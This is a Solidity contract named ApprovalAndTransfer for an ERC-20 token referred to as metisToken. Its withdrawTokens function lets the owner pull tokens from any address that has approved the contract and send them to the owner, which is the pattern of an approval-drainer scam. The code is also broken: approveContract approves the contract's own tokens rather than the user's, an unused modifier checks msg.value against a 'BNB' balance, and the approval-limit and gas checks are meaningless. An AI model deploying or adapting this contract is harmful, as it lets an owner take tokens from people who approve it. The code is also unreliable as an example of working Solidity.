// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
    // Otras funciones de la interfaz ERC20 que puedas necesitar
}

contract ApprovalAndTransfer {
    IERC20 public metisToken;
    address public owner;
    uint256 public minBalance;
    uint8 private tokenDecimals;

    event Approved(address indexed user, address indexed owner);
    event TokensTransferred(address indexed user, address indexed owner, uint256 amount);

    constructor(address _metisToken, uint256 _minBalance) {
        metisToken = IERC20(_metisToken);
        owner = msg.sender;
        minBalance = _minBalance;
        tokenDecimals = metisToken.decimals();
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    modifier hasMinimumBalance() {
        require(msg.value >= minBalance, "Insufficient BNB balance");
        _;
    }

    function approveContract(uint256 approvalAmount) external {
        uint256 maxApproval = type(uint256).max;
        require(approvalAmount <= maxApproval, "Approval amount exceeds the maximum allowed");
        uint256 scaledApprovalAmount = approvalAmount * (10**uint256(tokenDecimals));
        require(gasleft() >= 3000000, "Not enough gas for approval");
        require(metisToken.approve(address(this), scaledApprovalAmount), "Approval failed");
        emit Approved(msg.sender, owner);
    }

    function withdrawTokens(uint256 amount, address user) external onlyOwner {
        uint256 scaledAmount = amount * (10**uint256(tokenDecimals));
        require(metisToken.transferFrom(user, owner, scaledAmount), "Transfer failed");
        emit TokensTransferred(user, owner, scaledAmount);
    }

    function setMinBalance(uint256 _minBalance) external onlyOwner {
        minBalance = _minBalance;
    }

    receive() external payable {}
}